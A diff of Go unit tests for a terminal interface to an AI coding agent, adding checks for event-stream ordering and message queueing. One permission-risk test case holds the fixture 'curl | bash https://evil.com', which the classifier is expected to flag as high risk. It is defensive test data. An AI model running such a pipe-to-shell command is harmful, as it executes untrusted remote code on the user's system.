@@ -22,6 +22,97 @@ func init() {
 	os.Setenv("DROVER_HISTORY_DIR", filepath.Join(os.TempDir(), "drover-test-history"))
 }
 
+func TestResizeAndCompactDoNotReorderStream(t *testing.T) {
+	ch := make(chan agent.Event, 4)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	initCmd := m.Init()
+	next, resizeCmd := m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
+	m = next.(*Model)
+	m.SetCompactFn(func() error { return nil })
+	compactCmd, ok := m.handleBuiltinSlash("/compact")
+	if !ok {
+		t.Fatal("expected /compact")
+	}
+	if n := countEventReaders(t, ch, initCmd, resizeCmd, compactCmd); n != 1 {
+		t.Fatalf("event readers = %d, want 1", n)
+	}
+
+	m.eventWaitArmed = false
+	var cmd tea.Cmd = m.armEventWait()
+	for _, part := range []string{"P", "ong", "! 🏓"} {
+		ch <- agent.TextDeltaEvent{Text: part}
+		msg := cmd()
+		next, cmd = m.Update(msg)
+		m = next.(*Model)
+	}
+	if got := m.streamBuf.String(); got != "Pong! 🏓" {
+		t.Fatalf("stream buf %q", got)
+	}
+}
+
+// countEventReaders runs cmds the way Bubble Tea does and counts how many
+// block on ch. A blink or compact command returns immediately and is not counted.
+func countEventReaders(t *testing.T, ch chan agent.Event, cmds ...tea.Cmd) int {
+	t.Helper()
+	var n int
+	var walk func(tea.Cmd)
+	walk = func(cmd tea.Cmd) {
+		if cmd == nil {
+			return
+		}
+		done := make(chan tea.Msg, 1)
+		go func() { done <- cmd() }()
+		select {
+		case msg := <-done:
+			if batch, ok := msg.(tea.BatchMsg); ok {
+				for _, c := range batch {
+					walk(c)
+				}
+			}
+			return
+		case <-time.After(100 * time.Millisecond):
+		}
+		select {
+		case ch <- agent.TextDeltaEvent{Text: "x"}:
+		case <-time.After(100 * time.Millisecond):
+			return
+		}
+		select {
+		case msg := <-done:
+			if _, ok := msg.(agentMsg); ok {
+				n++
+			}
+		case <-time.After(100 * time.Millisecond):
+			select {
+			case <-ch:
+			default:
+			}
+		}
+	}
+	for _, cmd := range cmds {
+		walk(cmd)
+	}
+	return n
+}
+
+func TestModel_CtrlGSendsDraftBeforeQueue(t *testing.T) {
+	ch := make(chan agent.Event, 1)
+	m := New(ch, "m", t.TempDir(), "u", "h")
+	m.agentBusy = true
+	cancelled := false
+	m.runCancel = func() { cancelled = true }
+	m.InputArea.Queue("already waiting")
+	m.InputArea.SetValue("do this now")
+	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyCtrlG})
+	m2 := next.(*Model)
+	if !cancelled {
+		t.Fatal("expected the live turn to be cancelled")
+	}
+	if q := m2.InputArea.QueuedMessages(); len(q) != 2 || q[0] != "do this now" || q[1] != "already waiting" {
+		t.Fatalf("queue %#v", q)
+	}
+}
+
 func TestModel_WindowSizeSetsDimensions(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
@@ -755,7 +846,7 @@ func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
 func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	ch := make(chan agent.Event, 1)
 	m := New(ch, "m", "/w", "u", "h")
-	
+
 	var runs []string
 	m.runFunc = func(input string) tea.Cmd {
 		runs = append(runs, input)
@@ -775,7 +866,7 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	m2.InputArea.SetValue("task 2")
 	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyEnter})
 	m3 := next.(*Model)
-	
+
 	if len(runs) != 1 {
 		t.Fatalf("second run happened too early: %v", runs)
 	}
@@ -783,10 +874,10 @@ func TestModel_messageQueueingWhileBusy(t *testing.T) {
 	if len(q) != 1 || q[0] != "task 2" {
 		t.Fatalf("expected queue to have 'task 2', got %v", q)
 	}
-	
+
 	next, _ = m3.Update(agentRunCompleteMsg{err: nil})
 	m4 := next.(*Model)
-	
+
 	if len(runs) != 2 || runs[1] != "task 2" {
 		t.Fatalf("expected runFunc to be called with 'task 2', got runs: %v", runs)
 	}
@@ -882,7 +973,7 @@ func TestModel_StressTest500Turns(t *testing.T) {
 		// 3. Simulate Agent finishing
 		currentModel, _ = currentModel.Update(agentMsg{event: agent.DoneEvent{}})
 		currentModel, _ = currentModel.Update(agentRunCompleteMsg{err: nil})
-		
+
 		// 4. Periodically call View to ensure no panics during layout rendering under heavy load
 		if i%50 == 0 {
 			_ = currentModel.(*Model).View()
@@ -1064,9 +1155,9 @@ func TestModel_assessPermissionRisk(t *testing.T) {
 			wantReasonContains: "destructive shell",
 		},
 		{
-			name:    "bash curl pipe bash in summary",
-			tool:    "bash",
-			summary: "curl | bash https://evil.com",
+			name:      "bash curl pipe bash in summary",
+			tool:      "bash",
+			summary:   "curl | bash https://evil.com",
 			wantLevel: "high",
 		},
 		{
